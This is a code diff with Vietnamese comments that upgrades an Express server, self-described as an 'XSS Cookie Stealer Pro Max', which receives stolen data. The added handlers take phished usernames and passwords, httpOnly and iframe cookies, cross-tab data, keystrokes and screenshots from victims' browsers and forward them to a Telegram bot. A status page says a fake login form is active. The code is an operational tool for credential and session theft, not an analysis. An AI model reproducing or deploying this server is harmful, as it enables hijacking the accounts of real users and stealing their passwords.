@@ -1,7 +1,8 @@
 /**
  * ============================================
- *  🚀 XSS COOKIE STEALER SERVER
- *  Dành cho Render.com
+ *  🚀 XSS COOKIE STEALER SERVER - PRO MAX
+ *  Nhận cookie, keylog, screenshot, credentials
+ *  Gửi về Telegram Bot
  * ============================================
  */
 
@@ -24,7 +25,7 @@ app.use(cors({
 }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use(express.static('public')); // Serve file tĩnh từ thư mục public
+app.use(express.static('public'));
 
 // ====== LOG FILE ======
 const LOG_FILE = path.join(__dirname, 'cookies.log');
@@ -33,8 +34,13 @@ const LOG_FILE = path.join(__dirname, 'cookies.log');
 async function sendToTelegram(message) {
     if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN') {
         console.log('⚠️ Chưa cấu hình BOT_TOKEN');
-        console.log('📩 Tin nhắn sẽ gửi:', message);
+        console.log('📩 Tin nhắn:', message);
         return;
+    }
+
+    // Tin nhắn dài quá thì cắt bớt
+    if (message.length > 4000) {
+        message = message.substring(0, 3900) + '\n\n... (cắt ngắn)';
     }
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -70,20 +76,76 @@ function logToFile(data) {
     } catch (_) {}
 }
 
-// ====== ENDPOINT NHẬN COOKIE ======
+// ====== ENDPOINT NHẬN DỮ LIỆU ======
 app.post('/steal', async (req, res) => {
     const cookies = req.headers.cookie || 'Không có cookie';
     const data = req.body || {};
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
 
-    console.log(`📩 Nhận cookie từ ${ip}`);
+    console.log(`📩 Nhận dữ liệu từ ${ip}`);
 
     // Xây dựng tin nhắn
-    let message = '🍪 **XSS COOKIE STEALER**\n\n';
+    let message = '';
+
+    // ====== XỬ LÝ LOGIN CREDENTIALS ======
+    if (data.type === 'login_credentials') {
+        message = `🔐 **LOGIN CREDENTIALS**\n\n`;
+        message += `👤 **Username:** \`${data.username || 'Không có'}\`\n`;
+        message += `🔑 **Password:** \`${data.password || 'Không có'}\`\n`;
+        message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
+        message += `🔌 **IP:** ${ip}\n`;
+        message += `🕒 **Time:** ${new Date().toLocaleString('vi-VN')}\n\n`;
+        message += `⚠️ **ĐÂY LÀ THÔNG TIN QUAN TRỌNG NHẤT!**`;
+        
+        logToFile({ type: 'login', ip, data });
+        await sendToTelegram(message);
+        return res.json({ status: 'ok', type: 'login' });
+    }
+
+    // ====== XỬ LÝ HTTPONLY COOKIE ======
+    if (data.type === 'httpOnly_cookie') {
+        message = `🔒 **HTTPONLY COOKIE DETECTED**\n\n`;
+        message += `🍪 **Cookie:**\n\`\`\`\n${data.cookies || 'Không có'}\n\`\`\`\n\n`;
+        message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
+        message += `🔌 **IP:** ${ip}\n`;
+        message += `🕒 **Time:** ${new Date().toLocaleString('vi-VN')}`;
+        
+        logToFile({ type: 'httponly', ip, data });
+        await sendToTelegram(message);
+        return res.json({ status: 'ok', type: 'httponly' });
+    }
+
+    // ====== XỬ LÝ IFRAME COOKIE ======
+    if (data.type === 'iframe_cookie') {
+        message = `🖥️ **IFRAME COOKIE**\n\n`;
+        message += `🍪 **Cookie:**\n\`\`\`\n${data.cookies || 'Không có'}\n\`\`\`\n\n`;
+        message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
+        message += `🔌 **IP:** ${ip}`;
+        
+        logToFile({ type: 'iframe', ip, data });
+        await sendToTelegram(message);
+        return res.json({ status: 'ok', type: 'iframe' });
+    }
+
+    // ====== XỬ LÝ CROSS-TAB DATA ======
+    if (data.type === 'cross_tab_data') {
+        message = `📂 **CROSS-TAB DATA**\n\n`;
+        message += `💾 **Data:**\n\`\`\`json\n${JSON.stringify(data.data || {}, null, 2)}\n\`\`\`\n\n`;
+        message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
+        message += `🔌 **IP:** ${ip}`;
+        
+        logToFile({ type: 'crosstab', ip, data });
+        await sendToTelegram(message);
+        return res.json({ status: 'ok', type: 'crosstab' });
+    }
+
+    // ====== XỬ LÝ DỮ LIỆU THÔNG THƯỜNG ======
+    message = `🍪 **XSS COOKIE STEALER**\n\n`;
     message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
     message += `🌐 **Domain:** ${data.domain || 'Không xác định'}\n`;
     message += `🖥️ **User-Agent:** ${data.userAgent || 'Không có'}\n`;
     message += `📱 **Screen:** ${data.screen || 'Không có'}\n`;
+    message += `📱 **Mobile:** ${data.isMobile ? '✅ Có' : '❌ Không'}\n`;
     message += `🔌 **IP:** ${ip}\n`;
     message += `🕒 **Time:** ${new Date().toLocaleString('vi-VN')}\n\n`;
 
@@ -137,28 +199,9 @@ app.post('/steal', async (req, res) => {
 
     res.status(200).json({ 
         status: 'ok', 
-        message: 'Cookie received',
+        message: 'Data received',
         timestamp: new Date().toISOString()
     });
-});
-
-// ====== ENDPOINT NHẬN QUA GET (CHO IMG TAG) ======
-app.get('/steal', async (req, res) => {
-    const cookies = req.headers.cookie || 'Không có cookie';
-    const query = req.query;
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
-
-    let message = '🍪 **XSS COOKIE STEALER (GET)**\n\n';
-    message += `🔌 **IP:** ${ip}\n`;
-    message += `🍪 **Cookie:** \`${cookies}\`\n`;
-    if (query.data) {
-        message += `📦 **Data:** \`${query.data}\`\n`;
-    }
-
-    logToFile({ ip, cookies, query });
-    await sendToTelegram(message);
-
-    res.send('OK');
 });
 
 // ====== ENDPOINT NHẬN KEYLOG ======
@@ -179,12 +222,10 @@ app.post('/screenshot', express.raw({ type: 'application/octet-stream', limit: '
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
     
     try {
-        // Lưu ảnh tạm
         const filename = `screenshot_${Date.now()}.png`;
         const filepath = path.join(__dirname, filename);
         fs.writeFileSync(filepath, req.body);
 
-        // Gửi ảnh qua Telegram
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
         const blob = new Blob([req.body], { type: 'image/png' });
@@ -197,7 +238,6 @@ app.post('/screenshot', express.raw({ type: 'application/octet-stream', limit: '
             body: formData
         });
 
-        // Xóa file tạm
         fs.unlinkSync(filepath);
 
         res.json({ status: 'ok' });
@@ -210,15 +250,16 @@ app.post('/screenshot', express.raw({ type: 'application/octet-stream', limit: '
 // ====== TEST ENDPOINT ======
 app.get('/test', (req, res) => {
     res.send(`
-        <h1>🚀 XSS Cookie Stealer Server</h1>
+        <h1>🚀 XSS Cookie Stealer Pro Max</h1>
         <p>✅ Server đang chạy!</p>
-        <p>📩 POST <code>/steal</code> - Nhận cookie</p>
+        <p>📩 POST <code>/steal</code> - Nhận dữ liệu</p>
         <p>📩 GET <code>/steal</code> - Nhận cookie (GET)</p>
         <p>📩 POST <code>/keylog</code> - Nhận keylog</p>
         <p>📸 POST <code>/screenshot</code> - Nhận screenshot</p>
         <p>📋 GET <code>/logs</code> - Xem logs</p>
         <p>🕒 Time: ${new Date().toLocaleString('vi-VN')}</p>
         <hr>
+        <p>🔐 <strong>Fake Login Form</strong> đã được kích hoạt!</p>
         <p>🍪 <a href="/">Trang chính</a></p>
     `);
 });
@@ -240,7 +281,7 @@ app.get('/', (req, res) => {
 // ====== START ======
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server đang chạy trên port ${PORT}`);
-    console.log(`📩 POST /steal - Nhận cookie`);
+    console.log(`📩 POST /steal - Nhận dữ liệu`);
     console.log(`📩 GET /steal - Nhận cookie (GET)`);
     console.log(`📩 POST /keylog - Nhận keylog`);
     console.log(`📸 POST /screenshot - Nhận screenshot`);
